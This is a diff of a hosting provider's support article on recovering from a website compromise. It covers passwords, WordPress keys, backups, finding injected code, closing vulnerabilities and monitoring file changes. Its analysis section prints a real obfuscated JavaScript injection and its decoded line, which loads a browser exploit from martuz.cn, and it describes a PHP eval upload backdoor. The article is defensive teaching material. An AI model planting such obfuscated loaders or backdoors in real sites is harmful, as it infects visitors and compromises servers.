@@ -1,6 +1,7 @@
 ---
-node_id: 691
-title: Recovering from and dealing with a site compromise
+permalink: recovering-from-and-dealing-with-a-site-compromise/
+audit_date:
+title: Recover from, and deal with, a site compromise
 type: article
 created_date: '2011-03-16'
 created_by: Rackspace Support
@@ -16,7 +17,7 @@ can be used to track down the source of the compromise. Please follow
 the following suggestions for responding to a site compromise
 incident.
 
-### <span class="mw-headline">Step One: Secure your workstation </span>
+### Secure your workstation
 
 Most site compromises result from the harvesting of valid login
 credentials (FTP/SFTP, or web site CMS logins) from the workstation used
@@ -45,11 +46,7 @@ If your workstation is not secured, even if the site compromise is
 resolved, it is likely the malicious party will harvest your new
 passwords and compromise your site again.
 
-------------------------------------------------------------------------
-
-
-
-### <span class="mw-headline">Step Two: Change all passwords </span>
+### Change all passwords
 
 Assume all passwords have been compromised related to the hack. If any
 of your scripts contained passwords for databases and such, assume those
@@ -65,25 +62,23 @@ password.
 
 Bad Examples: passw0rd, username1, sunshine, guessme
 
-Good Examples: p\#sS8oR=, m3161Tx, The\[s\]HOWMUstGoOn
+Good Examples: p#sS8oR=, m3161Tx, The[s]HOWMUstGoOn
 
 If you didn't before, start changing your password regularly. A
 constantly changing password is much harder to brute force.
 
-
-
-### <span class="mw-headline">Key Change </span>
+#### Key change
 
 This information brought to you by
-Wordpress.org.[\[1\]](http://codex.wordpress.org/Editing_wp-config.php#Security_Keys "http://codex.wordpress.org/Editing_wp-config.php#Security_Keys")
+Wordpress.org.[[1]](http://codex.wordpress.org/Editing_wp-config.php#Security_Keys "http://codex.wordpress.org/Editing_wp-config.php#Security_Keys")
 
 If you are running a Wordpress site, and have been recently compromised,
 you will want to change your keys.
 
-Beginning with Version 2.6, three (3) security keys, AUTH\_KEY,
-SECURE\_AUTH\_KEY, and LOGGED\_IN\_KEY, were added to insure better
+Beginning with Version 2.6, three (3) security keys, AUTH_KEY,
+SECURE_AUTH_KEY, and LOGGED_IN_KEY, were added to insure better
 encryption of information stored in the user's cookies. Beginning with
-Version 2.7 a fourth key, NONCE\_KEY, was added to this group.
+Version 2.7 a fourth key, NONCE_KEY, was added to this group.
 
 You don't have to remember the keys, just make them long and complicated
 or better yet, use the the online generator. You can change these at any
@@ -92,10 +87,10 @@ users will have to login again.
 
 Example:
 
-    - define('AUTH_KEY', ':dr+%/5V4sAUG-gg%aS*v;&xGhd%{YKC^Z7KKGh j>k[.Nf$y7iGKdJ3c*[Kr5Bg');
-    - define('SECURE_AUTH_KEY', 'TufWOuA _.t>#+hA?^|3RfGTm>@*+S=8\"\'+\"}]<m#+}V)p:QijXLq,<h\\`39m_(');
-    - define('LOGGED_IN_KEY', 'S~AACm4h1;T^\"qW3_8Zv!Ji=y|)~5i63JI |Al[(<YS<2V^$T])=8Xh2a:b:}U_E');
-    - define('NONCE_KEY', 'k1+EOc-&w?hG8j84>6L9v\"6C89NH?ui{*3\\(t09mumL/fFP_!K$JCEkLuy ={x{0');
+    - `define('AUTH_KEY', ':dr+%/5V4sAUG-gg%aS*v;&xGhd%{YKC^Z7KKGh j>k[.Nf$y7iGKdJ3c*[Kr5Bg');`
+    - `define('SECURE_AUTH_KEY', 'TufWOuA _.t>#+hA?^|3RfGTm>@*+S=8\"\'+\"}]<m#+}V)p:QijXLq,<h\\`39m_(');`
+    - `define('LOGGED_IN_KEY', 'S~AACm4h1;T^"qW3_8Zv!Ji=y|)~5i63JI |Al[(<YS<2V^$T])=8Xh2a:b:}U_E');`
+    - `define('NONCE_KEY', 'k1+EOc-&w?hG8j84>6L9v"6C89NH?ui{*3\\(t09mumL/fFP_!K$JCEkLuy ={x{0');`
 
 A secret key is a hashing salt which makes your site harder to hack and
 access harder to crack by adding random elements to the password.
@@ -107,16 +102,12 @@ broken. A random, unpredictable password such as
 "88a7da62429ba6ad3cb3c76a09641fc" takes years to come up with the right
 combination.
 
-
-
-### <span class="mw-headline">Step Three: Back up the compromised data</span>
+### Back up the compromised data
 
 Before you modify any of the compromised data you should create a backup
 to preserve as much information as possible.
 
-
-
-### FTP and SFTP
+#### FTP and SFTP
 
 One backup approach is to access your content via FTP and download the
 compromised files. While this would preserve your data it may not
@@ -130,16 +121,13 @@ their connection type to "SFTP".  In a Linux or Mac environment an SFTP
 download will normally preserve any custom file permissions on your
 backup.
 
-You can view more information about FTP and SFTP clients in [this
-article](/how-to/getting-started-with-cloud-sites-ftpsshfsftp-clients).
+You can view more information about FTP and SFTP clients in [this article](/how-to/getting-started-with-cloud-sites-ftpsshfsftp-clients).
 
-
-
-### <span class="mw-headline">File Permissions on Windows</span>
+#### File Permissions on Windows
 
 SFTP won't preserve permissions when downloading to a Windows machine,
 but some SFTP clients like Filezilla and WinSCP do offer the ability to
-edit file permissions remotely.  That would allow you to set the
+edit file permissions remotely. That would allow you to set the
 permissions manually when you restore the backed-up files.
 
 If you only have access to a Windows machine but really need to preserve
@@ -147,9 +135,7 @@ permissions you might set up a virtual environment running Linux (using
 a program like VMWare) and use SFTP from within that environment to make
 your backup.
 
-
-
-### <span class="mw-headline">Cleaning up</span>
+#### Cleaning up
 
 Once the current state is backed up, you have two options:
 
@@ -162,31 +148,26 @@ Imagine that your site is a crime scene. If you disturb the crime scene
 with even the smallest change, you may lose a crucial piece of evidence
 that could have been used to identify the criminal.
 
+### Identify what has been compromised
 
-
-### <span class="mw-headline">Step Four: Identify what has been compromised </span>
-
-There are many ways to identify a compromised. The easiest to detect is
+There are many ways to identify a compromised site. The easiest to detect is
 blatant defacement of the site, such as a message that reads *U R
 H4x0ReD!* that has replaced all content of the index page.
 Unfortunately, this type of compromise has fallen out of favor. Recently
 compromised sites try to remain undetected so that the resources can be
 used as long as possible. Back-doors are dropped in and hidden links are
 inserted to generate website traffic and often even profit via AdSense
-or to improve Google search rankings. Sometimes the first indication of
-such a compromise is a [Google Safe
-Browsing](http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html "http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html")
+or to improve Google search rankings.
+
+Sometimes the first indication of such a compromise is a [Google Safe Browsing](http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html)
 warning that the site contains malicious content (malware) or spam.
-Sometimes the site gets added to spam blockers such as
-[SpamHaus](http://www.spamhaus.org/ "http://www.spamhaus.org/") because
+Sometimes the site gets added to spam blockers such as [SpamHaus](http://www.spamhaus.org/) because
 a mass e-mail spam campaign is utilizing your website resources or
-contains a link to your website in the spam messages. In the later case,
+contains a link to your website in the spam messages. In the latter case,
 pages are generally added in the document root that contain spam or
 redirect to spam sites to sell Viagra or similar products.
 
-
-
-### <span class="mw-headline">Example injected code </span>
+#### Example injected code
 
 Search the source code for injected--and often hidden--links or scripts
 or iframes (inline frames). Use a program that can show the differences
@@ -203,17 +184,13 @@ because the script can search for the opening body tag, and simply
 insert code after it. A hacker could do it with a single line of Perl
 code.
 
-
-
-### <span class="mw-headline">Locating compromised files </span>
+#### Locating compromised files
 
 The example above is very straightforward and very easy to identify and
 rectify. Identify it by recursively iterating all site content while
 searching for three key words: body, iframe, hidden.
 
-
-
-### <span class="mw-headline">Where malicious code is usually inserted </span>
+#### Where malicious code is usually inserted
 
 These simple HTML code injections--iframe hijacks in this
 case--generally get inserted in one of 3 places:
@@ -227,9 +204,7 @@ want to slightly modify your search criteria as to catch all three
 common scenarios. Once you have your list of likely compromised files,
 you can use this as input for a routine to repair the files.
 
-
-
-### <span class="mw-headline">Dealing with obfuscated code </span>
+#### Dealing with obfuscated code
 
 In the previous example, there is one key factor involved: the iframe
 was injected using plain HTML. This is common, but quickly becoming less
@@ -240,8 +215,7 @@ its not clear what the code does without evaluation, then they
 significantly increase the chance that you might not even notice it
 while scouring over the source code.
 
-Assume a scenario where [Google Safe
-Browsing](http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html "http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html")
+Assume a scenario where [Google Safe Browsing](http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html)
 warns that the site contains links to *malicious.cn*, that are known for
 hosting spyware or malware. Instinctively you search over your source
 code looking for *malicious.cn*, but find nothing. Odd. You browse your
@@ -257,9 +231,7 @@ could be several explanations; here are a couple:
 Let's take one example for both server side and client side scripting
 languages.
 
-
-
-#### <span class="mw-headline">Client-side with Javascript</span>
+#### Client-side with Javascript
 
 Using javascript one could obfuscate the iframe hijack code in many ways
 to prevent a simple text search from finding it. The two most common
@@ -301,7 +273,7 @@ malicious content that when evaluated later will insert the iframe:
 
 The new variable will contain the same string assigned to **Awin5N**,
 except now colon is replaced with the proper delimiter for
-**unescape()**, the percent sign. Below is the resulting string stored
+**unescape()**, the percent sign. Following is the resulting string stored
 in **VAIP**:
 
     'var%20a%3d%22%53cr%69ptE%6e%67ine%22%2cb%3d%22Ve%72sion()+%22%2c%6a%3d%22%22%2c%75%3dnavi%67ator%2eu%73erAg%65nt%3bif%28(u%%2eind%65%78Of%28%22C%68ro%6de%220)%26%26%28u%2eindex%4ff(%22Wi%6e%22)%3e0)%26%28u%2eind%65xOf%28%22%4eT%206%22)%3c0)%26%26(docu%6d%65nt%2ec%6fo%6bie%2e%69%6exOf(%22m%69ek%3d1%22)%3c0%29%26%26(ty%70%65o%66(%7arvz%74s%29%21%3d%74ypeof%28%22A%22)))%7bzr%76%7ats%3d%22A%22%3beva%6c(%22if(window%2e%22+a%2b%22%29j%3dj+%22+a+%22Major%22+b+a+%22%4di%6eor%22+b+a+%22%42%75i%6c%64%22%2bb+%22j%3b%22%29%3bd%6fcu%6dent%2ewr%%69%74e%28%22%3cscri%70t%20s%72c%3d%2f%2fmart%22%2b%63n%2fvid%2f%3fid%3d%22%2bj+%22%3c%5c%2fscrip%74%3e%29%3b%7d'
@@ -374,8 +346,7 @@ variable **j**. These will be used in the next line of code:
     document.write(<script src=//martuz.cn/vid/?id=Major+Minor+Build></script>);
 
 Finally we have reached the portion of code that has been setting off
-alarms with [Google Safe
-Browsing](http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html "http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html").
+alarms with [Google Safe Browsing](http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html).
 This line inserts HTML into the web page that includes a script from a
 remote URL that is specifically crafted to exploit a particular version
 of the browser.
@@ -398,9 +369,7 @@ one-liner, such as the examples presented previously. **Perl**, **sed**
 and **Ruby** all have one-liner execution options, to name a few tools
 that could be used.
 
-
-
-#### <span class="mw-headline">Server-side with PHP</span>
+#### Server-side with PHP
 
 The same principles apply server-side that applied to client-side
 scripting languages. When trying to identify malicious content, remember
@@ -435,12 +404,10 @@ and client-side scripting languages--as well as a healthy dose of
 encoding--it is very easy to hide the source of malicious content.
 However, by obfuscating the content, the attacker creates a few easily
 identifiable clues. Now that we know some of those clues, (**eval**,
-**unescape**, **base64\_encode**, **gzinflate**, etc), we can better
+**unescape**, **base64_encode**, **gzinflate**, etc), we can better
 track down and identify the source of the malicious content.
 
-
-
-### <span class="mw-headline">Step Five: Find the vulnerability </span>
+###  Find the vulnerability
 
 Up until this point, all we have been doing is identifying the results
 of the vulnerability. The next step is to plug the hole so that it does
@@ -448,9 +415,7 @@ not continue to be exploited. Again, the possibilities are too numerous
 for us to cover them all, so instead we'll mention a few of the most
 common that I have found, and give a real world example.
 
-
-
-### <span class="mw-headline">Passwords</span>
+#### Passwords
 
 The first thing we did was to change all passwords. If the attacker
 knows the passwords, there is no stopping him from doing anything. The
@@ -461,17 +426,15 @@ Choose a strong password. The password could also have been sniffed off
 the network. If you use unencrypted protocols such as vanilla FTP, then
 the password is sent in the clear. Anyone capable of eavesdropping on
 the network traffic could extract the password. Password protected URLs
-using **Apache's mod\_auth\_basic (.htpasswd) offers no encryption**.
+using **Apache's mod_auth\_basic (.htpasswd) offers no encryption**.
 This, too, could be easily picked up using a network sniffer or the
 password could brute forced. Oftentimes administrative pages are
 protected using this type of access control, so it's important to know
-the weaknesses that are inherit to it. **Review every resource protected
-by password authentication--this includes databases--and make sure the
-passwords are transmitted and stored encrypted.**
+the weaknesses that are inherit to it.
 
+**Note:** Review every resource protected by password authentication--this includes databases--and make sure the passwords are transmitted and stored encrypted.
 
-
-### <span class="mw-headline">Third-party drop-ins</span>
+#### Third-party drop-ins
 
 If you are using a third party drop-in such as one of the popular
 Content Management Systems--WordPress, Joomla, Drupal, Movable Type,
@@ -491,9 +454,7 @@ updates immediately and consider consulting the vendor's forums to
 determine if other users have been affected and whether a new patch will
 be made available soon.
 
-
-
-### <span class="mw-headline">Weak input validation</span>
+#### Weak input validation
 
 Any part of your site that allows user input should be validated. This
 is the most common software vulnerability. The repercussions of not
@@ -504,9 +465,7 @@ instruction pointer. It is not only text input that needs to be
 validated; content type must be validated as well. Now we will use a
 real world scenario as an example.
 
-There was an instance where multiple web sites were flagged by [Google
-Safe
-Browsing](http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html "http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html")
+There was an instance where multiple web sites were flagged by [Google Safe Browsing](http://googleonlinesecurity.blogspot.com/2008/05/safe-browsing-diagnostic-to-rescue.html)
 for containing malware or spam. After investigation, it was discovered
 that nearly every HTML page had malicious links embedded that directed
 users to a site that attempted to exploit the browser. A single user
@@ -527,13 +486,13 @@ liner:
 
 This elegant one liner allows arbitrary execution of PHP code passed to
 the script via the POST HTTP header variable of **e**. Again, we find
-**eval** and **base64\_decode** are being used. Since the **images**
+**eval** and **base64_decode** are being used. Since the **images**
 path is going to be used to display the avatars, the URL is public,
 which makes this exploit available to anyone who knows the name of the
 PHP script, or any member that can upload their own avatar.
 
 The script should have validated the content type before allowing it to
-be uploaded. Below is a snippit of PHP code that could be used to
+be uploaded. Below is a snipit of PHP code that could be used to
 validate the content and ensure that the image size is reasonable for
 avatars. This could be used to patch the hole:
 
@@ -544,12 +503,10 @@ site. The more common vulnerabilities that lack of input validation
 leave open are Cross Site Scripting (XSS), SQL Injections, and Cross
 Site Request Forgeries (CSRF). These vulnerabilities have existed since
 the 90s and continue to get exploited due to poor coding practices.
-[OWASP.org](http://www.owasp.org "http://www.owasp.org") provides good
+[OWASP.org](http://www.owasp.org) provides good
 information on secure coding practices.
 
-
-
-### <span class="mw-headline">Error Pages</span>
+#### Error Pages
 
 This is simple: do not allow debug info to be presented outside of a
 testing environment. Some languages default behavior is dump verbose
@@ -562,9 +519,7 @@ error has occurred. Make custom error pages to ensure the customer only
 sees what you expect them to see. Do not allow the attacker to easily
 reverse engineer your scripts by divulging the debug information.
 
-
-
-### <span class="mw-headline">Shared Hosting</span>
+### Shared Hosting
 
 Last, but certainly not least, are the extra precautions to take when
 using shared hosting, such as the Rackspace Cloud Sites. The environment
@@ -582,9 +537,7 @@ permissions. Temp data is likely being stored in the default location,
 which is usually the same place for all users. Again, take special
 precautions in these situations to protect sensitive data.
 
-
-
-### <span class="mw-headline">Step Six: Clean Up </span>
+### Clean Up
 
 Now that you have identified the compromised content, and plugged the
 vulnerability, you can proceed with [restoring the original
@@ -594,22 +547,17 @@ See the [previous examples](#Locating_compromised_files) of how to use
 in-place edit one-liners to automate searching and replacing bad
 content.
 
-
-
-### <span class="mw-headline">Step Seven: Preventative/Counter Measures </span>
+#### Preventative/Counter Measures
 
 Here is where we will discuss some tips to help improve security and
 awareness.
 
-
-
-### <span class="mw-headline">Monitor File Changes</span>
+#### Monitor File Changes
 
 Rackspace Cloud Sites offers the ability to schedule jobs to execute.
 People know this as batch jobs or--in the Linux world--as cron jobs. You
 can create a job that monitors the integrity of your content for
-changes. [Message Digest 5
-(MD5)](http://en.wikipedia.org/wiki/MD5 "http://en.wikipedia.org/wiki/MD5")
+changes. [Message Digest 5 (MD5)](http://en.wikipedia.org/wiki/MD5 "http://en.wikipedia.org/wiki/MD5")
 is a hashing algorithm that takes all of the bits of a file, throws them
 in a blender with some crazy hashing algorithm, and generates a
 relatively unique value; this value is called the checksum of the
@@ -638,4 +586,3 @@ you have approved. If it is not a change you expected, investigate
 immediately to ensure your content has not been compromised. Be aware
 that your script can also become compromised, so it's a good idea to
 keep it out of the website's document root.
-
